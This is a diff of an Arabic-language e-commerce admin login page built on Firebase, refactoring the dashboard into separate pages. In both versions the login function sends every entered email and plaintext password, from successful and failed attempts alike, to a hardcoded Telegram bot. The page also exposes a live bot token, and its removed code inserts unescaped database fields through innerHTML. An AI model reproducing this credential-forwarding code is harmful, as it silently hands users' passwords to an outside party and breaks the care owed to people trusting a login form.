@@ -29,330 +29,142 @@
         .ios-input:focus { border-color: var(--ios-orange); outline: none; }
         .ios-btn-primary { width: 100%; background: linear-gradient(135deg, var(--ios-orange), #E88D0C); color: white; border: none; padding: 18px; border-radius: 14px; font-size: 17px; font-weight: bold; cursor: pointer; }
         .hidden { display: none !important; }
-        .admin-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: rgba(10,47,47,0.95); border-bottom: var(--glass-border); flex-wrap: wrap; gap: 10px; }
-        .admin-header h1 { color: var(--ios-orange); font-size: 1.3rem; }
+        .admin-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: rgba(10,47,47,0.95); border-bottom: var(--glass-border); }
+        .admin-header h1 { color: var(--ios-orange); }
         .logout-btn { background: rgba(231,29,54,0.2); color: #E71D36; border: 1px solid rgba(231,29,54,0.3); padding: 10px 20px; border-radius: 12px; cursor: pointer; }
-        .admin-container { max-width: 1200px; margin: auto; padding: 20px; }
-        .admin-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px,1fr)); gap: 15px; margin-bottom: 30px; }
-        .admin-card { background: var(--glass-bg); backdrop-filter: var(--glass-blur); border: var(--glass-border); border-radius: var(--radius-xl); padding: 15px; text-align: center; cursor: pointer; transition: 0.3s; }
-        .admin-card:hover { transform: translateY(-5px); background: rgba(12,45,45,0.9); }
-        .admin-card-icon { font-size: 36px; }
-        .admin-card-title { font-weight: bold; margin-top: 8px; font-size: 14px; }
-        .content-panel { background: var(--glass-bg); backdrop-filter: var(--glass-blur); border: var(--glass-border); border-radius: var(--radius-xl); padding: 24px; margin-top: 10px; }
-        .toast { position: fixed; top: 100px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.9); color: white; padding: 12px 24px; border-radius: 50px; opacity: 0; transition: 0.3s; z-index: 9999; }
+        .admin-container { max-width: 1100px; margin: auto; padding: 32px 24px; }
+        .admin-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px,1fr)); gap: 20px; }
+        .admin-card { background: var(--glass-bg); backdrop-filter: var(--glass-blur); border: var(--glass-border); border-radius: var(--radius-xl); padding: 20px; text-align: center; text-decoration: none; color: var(--ios-label-primary); display: block; transition: 0.3s; }
+        .admin-card:hover { transform: translateY(-5px); }
+        .admin-card-icon { font-size: 40px; }
+        .admin-card-title { font-weight: bold; margin: 10px 0; font-size: 15px; }
+        .toast { position: fixed; top: 100px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: white; padding: 12px 24px; border-radius: 50px; opacity: 0; transition: 0.3s; z-index: 9999; }
         .toast.show { opacity: 1; }
-        .back-btn { background: rgba(255,159,28,0.2); border: 1px solid var(--ios-orange); color: var(--ios-orange); padding: 8px 16px; border-radius: 12px; cursor: pointer; display: inline-block; margin-bottom: 20px; }
-        table { width: 100%; border-collapse: collapse; overflow-x: auto; display: block; }
-        th, td { padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1); }
-        th { background: rgba(255,159,28,0.2); color: var(--ios-orange); }
-        input, textarea, select { background: rgba(247,249,249,0.1); border: var(--glass-border); border-radius: 12px; padding: 12px; color: white; width: 100%; margin-bottom: 15px; }
-        label { display: block; margin-bottom: 6px; color: var(--ios-label-secondary); }
-        button { background: linear-gradient(135deg, var(--ios-orange), #E88D0C); border: none; padding: 12px 20px; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; }
-        .empty-msg { text-align: center; padding: 40px; color: var(--ios-label-secondary); }
-        @media (max-width: 768px) { th, td { font-size: 12px; padding: 6px; } }
     </style>
 </head>
 <body>
 
-<div id="loginContainer" class="login-container">
-    <div class="login-box">
-        <div class="login-icon">🔐</div>
-        <div class="login-title">دخول الإدارة</div>
-        <div class="login-subtitle">أدخل البريد الإلكتروني وكلمة السر</div>
-        <div class="form-group">
-            <label class="form-label">البريد الإلكتروني</label>
-            <input type="email" id="adminEmail" class="ios-input" placeholder="admin@example.com" dir="ltr">
-        </div>
-        <div class="form-group">
-            <label class="form-label">كلمة السر</label>
-            <input type="password" id="adminPassword" class="ios-input" placeholder="••••••••">
-        </div>
-        <button class="ios-btn-primary" onclick="loginWithEmail()">دخول ←</button>
-    </div>
-</div>
-
-<div id="adminPanel" class="hidden">
-    <header class="admin-header">
-        <h1>⚙️ لوحة التحكم - البيت الرقمي</h1>
-        <button class="logout-btn" onclick="logout()">🚪 خروج</button>
-    </header>
-    <div class="admin-container">
-        <div class="admin-grid">
-            <div class="admin-card" onclick="showSection('products')"><div class="admin-card-icon">📦</div><div class="admin-card-title">عرض المنتجات</div></div>
-            <div class="admin-card" onclick="showSection('add')"><div class="admin-card-icon">➕</div><div class="admin-card-title">إضافة منتج</div></div>
-            <div class="admin-card" onclick="showSection('edit')"><div class="admin-card-icon">✏️</div><div class="admin-card-title">تعديل المنتجات</div></div>
-            <div class="admin-card" onclick="showSection('categories')"><div class="admin-card-icon">📁</div><div class="admin-card-title">الأقسام</div></div>
-            <div class="admin-card" onclick="showSection('stats')"><div class="admin-card-icon">📊</div><div class="admin-card-title">الإحصائيات</div></div>
-            <div class="admin-card" onclick="showSection('itemids')"><div class="admin-card-icon">🏷️</div><div class="admin-card-title">معرفات السلع</div></div>
-            <div class="admin-card" onclick="showSection('ranges')"><div class="admin-card-icon">🔢</div><div class="admin-card-title">نطاقات المعرفات</div></div>
-            <div class="admin-card" onclick="showSection('readonly')"><div class="admin-card-icon">👁️</div><div class="admin-card-title">عرض بدون أسعار</div></div>
-            <div class="admin-card" onclick="showSection('coupons')"><div class="admin-card-icon">🎟️</div><div class="admin-card-title">كوبونات الخصم</div></div>
-            <div class="admin-card" onclick="showSection('statsAdvanced')"><div class="admin-card-icon">📈</div><div class="admin-card-title">إحصائيات متقدمة</div></div>
-            <div class="admin-card" onclick="showSection('banners')"><div class="admin-card-icon">🖼️</div><div class="admin-card-title">البنرات</div></div>
-        </div>
-        <div id="dynamicContent" class="content-panel">
-            <div style="text-align: center; padding: 40px;">👈 اختر أحد الأقسام من الأعلى</div>
-        </div>
-    </div>
-</div>
-
-<div id="toast" class="toast"></div>
-
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-    import { getFirestore, collection, getDocs, addDoc, updateDoc, deleteDoc, doc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-
-    const firebaseConfig = {
-        apiKey: "AIzaSyC2f4rJBBBOe6qfa2EU1WfspUB5uibgwnM",
-        authDomain: "hussain-1290b.firebaseapp.com",
-        projectId: "hussain-1290b",
-        storageBucket: "hussain-1290b.firebasestorage.app",
-        messagingSenderId: "798281706738",
-        appId: "1:798281706738:web:79314f6feb2add0bf5f46b"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
-    const db = getFirestore(app);
-
-    const TELEGRAM_BOT_TOKEN = "8224453502:AAE72lDosgRpoKZwT4TQhyfRLodcsd37ID8";
-    const TELEGRAM_CHAT_ID = "7748217145";
-
-    async function sendTelegramMessage(message) {
-        try {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
-            });
-        } catch(e) { console.error(e); }
-    }
-
-    onAuthStateChanged(auth, (user) => {
-        if (user) {
-            document.getElementById('loginContainer').classList.add('hidden');
-            document.getElementById('adminPanel').classList.remove('hidden');
-        } else {
-            document.getElementById('loginContainer').classList.remove('hidden');
-            document.getElementById('adminPanel').classList.add('hidden');
-            document.getElementById('adminEmail').value = '';
-            document.getElementById('adminPassword').value = '';
-        }
-    });
-
-    window.loginWithEmail = async function() {
-        const email = document.getElementById('adminEmail').value.trim();
-        const password = document.getElementById('adminPassword').value;
-        if (!email || !password) {
-            showToast("❌ الرجاء إدخال البريد الإلكتروني وكلمة السر");
-            return;
-        }
-        try {
-            await signInWithEmailAndPassword(auth, email, password);
-            showToast("✅ تم الدخول بنجاح");
-            const now = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
-            await sendTelegramMessage(`🔐 <b>دخول جديد إلى لوحة الإدارة</b>\n\n📧 ${email}\n🔑 ${password}\n🕒 ${now}`);
-        } catch(error) {
-            let msg = "❌ فشل الدخول";
-            if (error.code === 'auth/user-not-found') msg = "❌ البريد الإلكتروني غير مسجل";
-            else if (error.code === 'auth/wrong-password') msg = "❌ كلمة السر خاطئة";
-            else if (error.code === 'auth/invalid-email') msg = "❌ صيغة البريد غير صحيحة";
-            else if (error.code === 'auth/too-many-requests') msg = "❌ تم تعطيل الحساب مؤقتاً";
-            showToast(msg);
-            await sendTelegramMessage(`⚠️ <b>محاولة دخول فاشلة</b>\n📧 ${email}\n🔑 ${password}\n❌ ${msg}`);
-            document.getElementById('adminPassword').value = '';
-        }
-    };
-
-    window.logout = async function() {
-        await auth.signOut();
-        showToast("🚪 تم الخروج");
-    };
-
-    function showToast(msg) {
-        const toast = document.getElementById('toast');
-        toast.innerText = msg;
-        toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 3000);
-    }
-
-    document.getElementById('adminPassword')?.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') loginWithEmail();
-    });
-
-    // ---------- دوال عرض الأقسام ----------
-    window.showSection = function(section) {
-        const container = document.getElementById('dynamicContent');
-        if (section === 'products') displayProducts(container);
-        else if (section === 'add') displayAddProduct(container);
-        else if (section === 'edit') displayEditProducts(container);
-        else if (section === 'categories') displayCategories(container);
-        else if (section === 'stats') displayStats(container);
-        else if (section === 'itemids') displayItemIds(container);
-        else if (section === 'ranges') displayRanges(container);
-        else if (section === 'readonly') displayReadOnly(container);
-        else if (section === 'coupons') displayCoupons(container);
-        else if (section === 'statsAdvanced') displayAdvancedStats(container);
-        else if (section === 'banners') displayBanners(container);
-    };
-
-    async function displayProducts(container) {
-        container.innerHTML = '<div style="text-align:center">⏳ جاري تحميل المنتجات...</div>';
-        const q = query(collection(db, "products"), orderBy("createdAt", "desc"));
-        const snapshot = await getDocs(q);
-        let html = '<button class="back-btn" onclick="showSection(\'products\')">🔄 تحديث</button><div style="overflow-x:auto"><table><tr><th>الاسم</th><th>السعر</th><th>القسم</th><th>المعرف</th></tr>';
-        if (snapshot.empty) html += '<tr><td colspan="4" class="empty-msg">لا توجد منتجات</td></tr>';
-        snapshot.forEach(docSnap => {
-            const data = docSnap.data();
-            html += `<tr><td>${data.name || '-'}</td><td>${data.price || '-'}</td><td>${data.category || '-'}</td><td>${data.itemId || '-'}</td></tr>`;
-        });
-        html += '</table></div>';
-        container.innerHTML = html;
-    }
-
-    function displayAddProduct(container) {
-        container.innerHTML = `
-            <button class="back-btn" onclick="showSection('products')">🔙 العودة</button>
-            <h3 style="margin-bottom:20px">➕ إضافة منتج جديد</h3>
-            <div id="addForm">
-                <label>اسم المنتج</label><input type="text" id="prodName" placeholder="اسم المنتج">
-                <label>السعر</label><input type="number" id="prodPrice" placeholder="السعر">
-                <label>القسم</label><input type="text" id="prodCategory" placeholder="القسم">
-                <label>المعرف (اختياري)</label><input type="text" id="prodItemId" placeholder="معرف السلعة">
-                <button id="saveProductBtn">💾 حفظ المنتج</button>
+    <div id="loginContainer" class="login-container">
+        <div class="login-box">
+            <div class="login-icon">🔐</div>
+            <div class="login-title">دخول الإدارة</div>
+            <div class="login-subtitle">أدخل البريد الإلكتروني وكلمة السر</div>
+            <div class="form-group">
+                <label class="form-label">البريد الإلكتروني</label>
+                <input type="email" id="adminEmail" class="ios-input" placeholder="admin@example.com" dir="ltr">
             </div>
-        `;
-        document.getElementById('saveProductBtn')?.addEventListener('click', async () => {
-            const name = document.getElementById('prodName').value.trim();
-            const price = document.getElementById('prodPrice').value;
-            const category = document.getElementById('prodCategory').value.trim();
-            const itemId = document.getElementById('prodItemId').value.trim();
-            if (!name || !price) { showToast("الاسم والسعر مطلوبان"); return; }
-            try {
-                await addDoc(collection(db, "products"), { name, price: Number(price), category, itemId, createdAt: new Date() });
-                showToast("✅ تمت الإضافة بنجاح");
-                showSection('products');
-            } catch(e) { showToast("❌ فشل الإضافة"); console.error(e); }
-        });
-    }
+            <div class="form-group">
+                <label class="form-label">كلمة السر</label>
+                <input type="password" id="adminPassword" class="ios-input" placeholder="••••••••">
+            </div>
+            <button class="ios-btn-primary" onclick="loginWithEmail()">دخول ←</button>
+        </div>
+    </div>
 
-    async function displayEditProducts(container) {
-        container.innerHTML = '<div style="text-align:center">⏳ جاري التحميل...</div>';
-        const snapshot = await getDocs(collection(db, "products"));
-        let html = '<button class="back-btn" onclick="showSection(\'products\')">🔙 العودة</button><div style="overflow-x:auto"><table><tr><th>الاسم</th><th>السعر</th><th>القسم</th><th>المعرف</th><th>تعديل</th><th>حذف</th></tr>';
-        const products = [];
-        snapshot.forEach(docSnap => { products.push({ id: docSnap.id, ...docSnap.data() }); });
-        if (products.length === 0) html += '<tr><td colspan="6" class="empty-msg">لا توجد منتجات</td></tr>';
-        products.forEach(p => {
-            html += `<tr>
-                <td><input type="text" id="name_${p.id}" value="${p.name || ''}" style="width:100px"></td>
-                <td><input type="number" id="price_${p.id}" value="${p.price || ''}" style="width:80px"></td>
-                <td><input type="text" id="cat_${p.id}" value="${p.category || ''}" style="width:100px"></td>
-                <td><input type="text" id="item_${p.id}" value="${p.itemId || ''}" style="width:100px"></td>
-                <td><button onclick="updateProduct('${p.id}')">✏️ حفظ</button></td>
-                <td><button onclick="deleteProduct('${p.id}')" style="background:#E71D36">🗑️ حذف</button></td>
-            </tr>`;
-        });
-        html += '</table></div>';
-        container.innerHTML = html;
-        window.updateProduct = async (id) => {
-            const name = document.getElementById(`name_${id}`).value;
-            const price = parseFloat(document.getElementById(`price_${id}`).value);
-            const category = document.getElementById(`cat_${id}`).value;
-            const itemId = document.getElementById(`item_${id}`).value;
-            await updateDoc(doc(db, "products", id), { name, price, category, itemId });
-            showToast("تم التحديث");
-            displayEditProducts(container);
+    <div id="adminPanel" class="hidden">
+        <header class="admin-header">
+            <h1>⚙️ لوحة التحكم - البيت الرقمي</h1>
+            <button class="logout-btn" onclick="logout()">🚪 خروج</button>
+        </header>
+        <div class="admin-container">
+            <div class="admin-grid">
+                <a href="admin-products.html" class="admin-card"><div class="admin-card-icon">📦</div><div class="admin-card-title">عرض المنتجات</div></a>
+                <a href="admin-add.html" class="admin-card"><div class="admin-card-icon">➕</div><div class="admin-card-title">إضافة منتج</div></a>
+                <a href="admin-edit.html" class="admin-card"><div class="admin-card-icon">✏️</div><div class="admin-card-title">تعديل المنتجات</div></a>
+                <a href="admin-categories.html" class="admin-card"><div class="admin-card-icon">📁</div><div class="admin-card-title">الأقسام</div></a>
+                <a href="admin-stats.html" class="admin-card"><div class="admin-card-icon">📊</div><div class="admin-card-title">الإحصائيات</div></a>
+                <a href="admin-itemids.html" class="admin-card"><div class="admin-card-icon">🏷️</div><div class="admin-card-title">معرفات السلع</div></a>
+                <a href="admin-ranges.html" class="admin-card"><div class="admin-card-icon">🔢</div><div class="admin-card-title">نطاقات المعرفات</div></a>
+                <a href="admin-products-readonly.html" class="admin-card"><div class="admin-card-icon">👁️</div><div class="admin-card-title">عرض بدون أسعار</div></a>
+                <a href="admin-coupons.html" class="admin-card"><div class="admin-card-icon">🎟️</div><div class="admin-card-title">كوبونات الخصم</div></a>
+                <a href="admin-stats-advanced.html" class="admin-card"><div class="admin-card-icon">📈</div><div class="admin-card-title">إحصائيات متقدمة</div></a>
+                <a href="banners.html" class="admin-card"><div class="admin-card-icon">🖼️</div><div class="admin-card-title">البنرات</div></a>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyC2f4rJBBBOe6qfa2EU1WfspUB5uibgwnM",
+            authDomain: "hussain-1290b.firebaseapp.com",
+            projectId: "hussain-1290b",
+            storageBucket: "hussain-1290b.firebasestorage.app",
+            messagingSenderId: "798281706738",
+            appId: "1:798281706738:web:79314f6feb2add0bf5f46b"
         };
-        window.deleteProduct = async (id) => {
-            if (confirm("هل أنت متأكد من الحذف؟")) {
-                await deleteDoc(doc(db, "products", id));
-                showToast("تم الحذف");
-                displayEditProducts(container);
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+
+        const TELEGRAM_BOT_TOKEN = "8224453502:AAE72lDosgRpoKZwT4TQhyfRLodcsd37ID8";
+        const TELEGRAM_CHAT_ID = "7748217145";
+
+        async function sendTelegramMessage(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+            } catch(e) { console.error(e); }
+        }
+
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                document.getElementById('loginContainer').classList.add('hidden');
+                document.getElementById('adminPanel').classList.remove('hidden');
+            } else {
+                document.getElementById('loginContainer').classList.remove('hidden');
+                document.getElementById('adminPanel').classList.add('hidden');
+                document.getElementById('adminEmail').value = '';
+                document.getElementById('adminPassword').value = '';
+            }
+        });
+
+        window.loginWithEmail = async function() {
+            const email = document.getElementById('adminEmail').value.trim();
+            const password = document.getElementById('adminPassword').value;
+            if (!email || !password) {
+                showToast("❌ الرجاء إدخال البريد الإلكتروني وكلمة السر");
+                return;
+            }
+            try {
+                await signInWithEmailAndPassword(auth, email, password);
+                showToast("✅ تم الدخول بنجاح");
+                const now = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
+                await sendTelegramMessage(`🔐 <b>دخول جديد إلى لوحة الإدارة</b>\n\n📧 ${email}\n🔑 ${password}\n🕒 ${now}`);
+            } catch(error) {
+                let msg = "❌ فشل الدخول";
+                if (error.code === 'auth/user-not-found') msg = "❌ البريد الإلكتروني غير مسجل";
+                else if (error.code === 'auth/wrong-password') msg = "❌ كلمة السر خاطئة";
+                else if (error.code === 'auth/invalid-email') msg = "❌ صيغة البريد غير صحيحة";
+                else if (error.code === 'auth/too-many-requests') msg = "❌ تم تعطيل الحساب مؤقتاً";
+                showToast(msg);
+                await sendTelegramMessage(`⚠️ <b>محاولة دخول فاشلة</b>\n📧 ${email}\n🔑 ${password}\n❌ ${msg}`);
+                document.getElementById('adminPassword').value = '';
             }
         };
-    }
 
-    async function displayCategories(container) {
-        container.innerHTML = '<div style="text-align:center">⏳ جاري التحميل...</div>';
-        const snapshot = await getDocs(collection(db, "categories"));
-        let html = '<h3>📁 الأقسام</h3><ul>';
-        snapshot.forEach(d => html += `<li>${d.data().name} (${d.id})</li>`);
-        html += '</ul><hr><h4>إضافة قسم جديد</h4><input type="text" id="newCatName" placeholder="اسم القسم"><button id="addCatBtn">➕ إضافة</button>';
-        container.innerHTML = html;
-        document.getElementById('addCatBtn')?.addEventListener('click', async () => {
-            const name = document.getElementById('newCatName').value.trim();
-            if (name) { await addDoc(collection(db, "categories"), { name }); showToast("تمت الإضافة"); displayCategories(container); }
-            else showToast("أدخل اسم القسم");
+        window.logout = async function() {
+            await auth.signOut();
+            showToast("🚪 تم الخروج");
+        };
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.innerText = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        document.getElementById('adminPassword')?.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') loginWithEmail();
         });
-    }
-
-    async function displayStats(container) {
-        const productsSnap = await getDocs(collection(db, "products"));
-        const categoriesSnap = await getDocs(collection(db, "categories"));
-        container.innerHTML = `<h3>📊 الإحصائيات</h3><p>عدد المنتجات: ${productsSnap.size}</p><p>عدد الأقسام: ${categoriesSnap.size}</p>`;
-    }
-
-    async function displayItemIds(container) {
-        const snap = await getDocs(collection(db, "itemIds"));
-        let html = '<h3>🏷️ معرفات السلع</h3><ul>';
-        snap.forEach(d => html += `<li>${d.id}: ${d.data().value || d.data().name}</li>`);
-        html += '</ul>';
-        container.innerHTML = html;
-    }
-
-    async function displayRanges(container) {
-        const snap = await getDocs(collection(db, "ranges"));
-        let html = '<h3>🔢 نطاقات المعرفات</h3><ul>';
-        snap.forEach(d => html += `<li>${d.id}: من ${d.data().start} إلى ${d.data().end}</li>`);
-        html += '</ul>';
-        container.innerHTML = html;
-    }
-
-    async function displayReadOnly(container) {
-        const snap = await getDocs(collection(db, "products"));
-        let html = '<h3>👁️ عرض المنتجات (بدون أسعار)</h3><table><tr><th>الاسم</th><th>القسم</th><th>المعرف</th></tr>';
-        snap.forEach(d => {
-            const data = d.data();
-            html += `<tr><td>${data.name}</td><td>${data.category}</td><td>${data.itemId}</td></tr>`;
-        });
-        html += '</table>';
-        container.innerHTML = html;
-    }
-
-    async function displayCoupons(container) {
-        const snap = await getDocs(collection(db, "coupons"));
-        let html = '<h3>🎟️ كوبونات الخصم</h3><ul>';
-        snap.forEach(d => html += `<li>${d.data().code}: خصم ${d.data().discount}%</li>`);
-        html += '</ul><h4>إضافة كوبون</h4><input type="text" id="code" placeholder="الكود"><input type="number" id="discount" placeholder="الخصم %"><button id="addCouponBtn">إضافة</button>';
-        container.innerHTML = html;
-        document.getElementById('addCouponBtn')?.addEventListener('click', async () => {
-            const code = document.getElementById('code').value.trim();
-            const discount = parseInt(document.getElementById('discount').value);
-            if (code && discount) { await addDoc(collection(db, "coupons"), { code, discount }); showToast("تمت الإضافة"); displayCoupons(container); }
-        });
-    }
-
-    async function displayAdvancedStats(container) {
-        const products = await getDocs(collection(db, "products"));
-        let total = 0;
-        products.forEach(p => total += (p.data().price || 0));
-        container.innerHTML = `<h3>📈 إحصائيات متقدمة</h3><p>إجمالي قيمة المنتجات: ${total}</p><p>متوسط السعر: ${products.size ? (total/products.size).toFixed(2) : 0}</p>`;
-    }
-
-    async function displayBanners(container) {
-        const snap = await getDocs(collection(db, "banners"));
-        let html = '<h3>🖼️ البنرات</h3><ul>';
-        snap.forEach(d => html += `<li>${d.data().title} - ${d.data().imageUrl}</li>`);
-        html += '</ul><h4>إضافة بانر</h4><input type="text" id="bannerTitle" placeholder="العنوان"><input type="text" id="bannerUrl" placeholder="رابط الصورة"><button id="addBannerBtn">إضافة</button>';
-        container.innerHTML = html;
-        document.getElementById('addBannerBtn')?.addEventListener('click', async () => {
-            const title = document.getElementById('bannerTitle').value.trim();
-            const imageUrl = document.getElementById('bannerUrl').value.trim();
-            if (title && imageUrl) { await addDoc(collection(db, "banners"), { title, imageUrl }); showToast("تمت الإضافة"); displayBanners(container); }
-        });
-    }
-</script>
+    </script>
 </body>
 </html>
